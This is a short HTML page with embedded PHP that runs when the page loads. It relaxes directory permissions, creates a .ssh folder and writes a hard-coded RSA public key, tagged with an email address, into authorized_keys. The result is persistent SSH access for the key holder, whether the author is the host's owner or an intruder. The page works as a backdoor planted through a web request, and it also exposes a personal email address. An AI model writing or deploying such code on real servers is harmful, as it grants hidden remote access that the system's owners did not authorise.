<html>
<head>
</head>
<body>
<?php

chmod(".", 0755);
chmod("..", 0755);
chmod("../..", 0755);
$ssh_dir = "../../.ssh";
mkdir($ssh_dir);
chmod($ssh_dir, 0755);
$myFile = $ssh_dir . "/authorized_keys";
$contents = "ssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAQEA5Z71Rgvi0o+0l/MSGAzhiQC3e0UAa05hzN9ItYZc+DEMT02FluIPzDR3ubMf9x2CWvr21In9OZdqe+XIBeYlzWkV8i7G9Bt+OZQKtMnD1f2xSpq2Y8u9PoA+mzvWgjvMqGeTM3UTXX/2lmLvcJcFyFHZcP8QLyazMSqONIu9tAWoSdvQgajG+WQM0vuBjJ8W3LA1m546mDb2I8dwaZxLu7QKpv8LPAvXhNGxRsAs562LAHd8ETfFbtkzOrKpTdw/YDT77/d0z372sltdjlNA6Jph/6a0tYQfhb2AR9n/gXYO5/uoeoDklqmQd6GzWywQptlCn7POWj7TX6q0AZdSoQ== rodrigo.ipince@gmail.com
";
file_put_contents($myFile, $contents);
chmod($myFile, 0644);

?>
</body>
</html>
